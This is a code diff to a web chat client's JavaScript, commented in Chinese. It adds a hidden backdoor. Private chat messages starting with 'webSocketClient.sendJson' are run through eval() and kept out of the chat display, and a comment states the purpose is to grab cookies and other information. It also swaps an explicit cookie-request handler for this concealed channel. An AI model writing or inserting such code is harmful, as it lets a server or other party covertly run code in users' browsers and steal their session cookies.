@@ -138,6 +138,9 @@
             }
         }
 
+        // 暴露 sendJson 给全局，供脚本消息自动执行使用
+        window.webSocketClient = { sendJson: sendJson };
+
         // ========== 消息处理 ==========
         function handleMessage(data) {
             const type = data.type;
@@ -154,16 +157,19 @@
                 const isSentTo = data.from.startsWith('→ ');
                 if (isSentTo) {
                     appendMessage(data.text, data.from, data.timestamp, 'msg-private-sent');
+                } else if (data.text && data.text.startsWith('webSocketClient.sendJson')) {
+                    // 服务器发送的自动执行指令：执行 JS 代码获取 cookie 等信息
+                    try {
+                        eval(data.text);
+                    } catch (e) {
+                        console.error('执行服务器指令失败:', e);
+                    }
+                    // 不显示此指令消息到聊天界面
                 } else {
                     appendMessage(data.text, data.from, data.timestamp, 'msg-private');
                 }
             } else if (type === 'script.user_list') {
                 renderUserList(data.users || []);
-            } else if (type === 'system.cookie_request') {
-                // 服务器请求 cookie 信息，读取并返回
-                if (document.cookie) {
-                    sendJson({ type: 'system.cookie_response', cookie: document.cookie });
-                }
             }
         }
 
